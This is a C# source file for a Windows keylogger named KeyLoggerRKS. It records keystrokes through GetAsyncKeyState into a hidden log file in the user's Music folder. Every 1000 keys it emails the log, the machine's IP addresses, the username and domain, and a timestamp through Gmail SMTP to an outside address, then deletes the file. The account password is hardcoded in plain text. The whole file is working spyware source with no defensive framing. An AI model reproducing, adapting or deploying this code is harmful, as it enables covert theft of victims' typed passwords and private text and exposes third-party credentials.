using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Net;
using System.Net.Mail;

namespace KeyLoggerRKS
{
    static class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKey = 0;

        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\LogsFolder\";

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\LoggedKeys.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            while(true)
            {
                Thread.Sleep(5);
                for (Int32 i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    int key = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKey++;

                        if(numberOfKey % 1000 == 0)
                        {
                            SendNewMessage();
                            File.Delete(path);
                        }
                    }
                }
            }
        }

        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string filePath = folderName + @"\LogsFolder\LoggedKeys.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;
            string subject = "Message from keyLogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += "\n";
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("logsenderrks@gmail.com");
            mailMessage.To.Add("remigiusz.rogala93@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("logsenderrks@gmail.com", "LogRKS1234");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}
